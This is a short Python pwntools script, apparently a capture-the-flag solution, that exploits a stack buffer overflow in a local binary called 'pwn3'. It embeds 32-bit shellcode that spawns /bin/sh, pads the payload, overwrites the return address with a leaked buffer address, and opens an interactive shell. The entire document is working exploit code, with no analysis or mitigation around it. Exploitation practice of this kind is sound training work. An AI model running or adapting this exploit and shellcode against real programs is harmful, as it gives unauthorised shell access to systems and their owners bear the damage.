from pwn import *

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
pay = b""
pay += shellcode
pay += b"A" * (302 - len(shellcode))

p = process("./pwn3")
p.recvuntil(b"Take this, you might need it on your journey ")
leak = p.recvline().strip(b"!\n")
print(f"BUffer Address : {leak}")

buff_addr = int(leak , 16)

pay += p32(buff_addr)

p.sendline(pay)
p.interactive()

